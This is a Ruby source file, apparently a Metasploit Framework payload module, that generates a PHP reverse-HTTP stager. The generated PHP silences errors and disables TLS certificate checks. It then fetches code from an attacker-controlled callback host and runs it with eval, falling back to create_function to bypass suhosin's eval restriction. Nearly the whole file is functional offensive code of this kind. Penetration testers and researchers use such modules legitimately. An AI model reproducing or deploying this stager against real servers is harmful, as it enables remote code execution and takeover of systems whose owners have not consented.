# -*- coding: binary -*-

module Msf

module Payload::Php::ReverseHttp

  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(info)
    register_options([
      OptPath.new('MALLEABLEC2', [false, 'Path to a file containing the malleable C2 profile'])
    ])
    register_advanced_options(
      Msf::Opt::http_header_options +
      Msf::Opt::http_proxy_options
    )
    deregister_options('HttpProxyType')
  end

  #
  # Generate the first stage
  #
  def generate(opts = {})
    opts[:scheme] = 'http' if opts[:scheme].nil?
    generate_reverse_http(opts)
  end

  #
  # Return the callback URL
  #
  def generate_callback_url(opts)
    if Rex::Socket.is_ipv6?(opts[:host])
      target_url = "#{opts[:scheme]}://[#{opts[:host]}]"
    else
      target_url = "#{opts[:scheme]}://#{opts[:host]}"
    end

    target_url << ':'
    target_url << opts[:port].to_s
    target_url << luri
    target_url << generate_callback_uri(opts)
    target_url
  end

  #
  # Return the longest URI that fits into our available space
  #
  def generate_callback_uri(opts = {})
    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))

    if self.available_space.nil? || dynamic_size? || required_space > self.available_space
      uri_req_len = 30
    end

    uuid = generate_payload_uuid(arch: ARCH_PHP, platform: 'php')
    generate_uri_uuid_mode(opts[:uri_uuid_mode] || :init_php, uri_req_len, uuid: uuid)
  end

  def generate_reverse_http(opts = {})
    ds = opts[:datastore] || datastore
    opts.merge!({
      host: ds['LHOST'] || '127.127.127.127',
      port: ds['LPORT'],
    })

    callback_url = generate_callback_url(opts)
    scheme = opts[:scheme]

    php = %Q^/*<?php /**/
error_reporting(0);
$url = '#{callback_url}';
$opts = array('#{scheme}' => array(
  'method' => 'GET',
  'timeout' => 30,
  'header' => "User-Agent: #{ds['HttpUserAgent'] || 'Mozilla/5.0'}\\r\\n",
  'ignore_errors' => true,
));
^

    if scheme == 'https'
      php << %Q^$opts['ssl'] = array(
  'verify_peer' => false,
  'verify_peer_name' => false,
  'allow_self_signed' => true,
);
^
    end

    proxy_host = ds['HttpProxyHost']
    if proxy_host.to_s != ''
      proxy_port = ds['HttpProxyPort'] || 8080
      php << %Q^$opts['#{scheme}']['proxy'] = 'tcp://#{proxy_host}:#{proxy_port}';
$opts['#{scheme}']['request_fulluri'] = true;
^
    end

    php << %Q^$ctx = stream_context_create($opts);
$b = file_get_contents($url, false, $ctx);
if ($b === false) { die(); }
if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'))
{
  $suhosin_bypass = create_function('', $b);
  $suhosin_bypass();
}
else
{
  eval($b);
}
die();^

    php.gsub!(/#.*$/, '')
    Rex::Text.compress(php)
  end

  def transport_config(opts = {})
    transport_config_reverse_http(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    space = cached_size
    space += 100
    space += 256
    space
  end
end

end
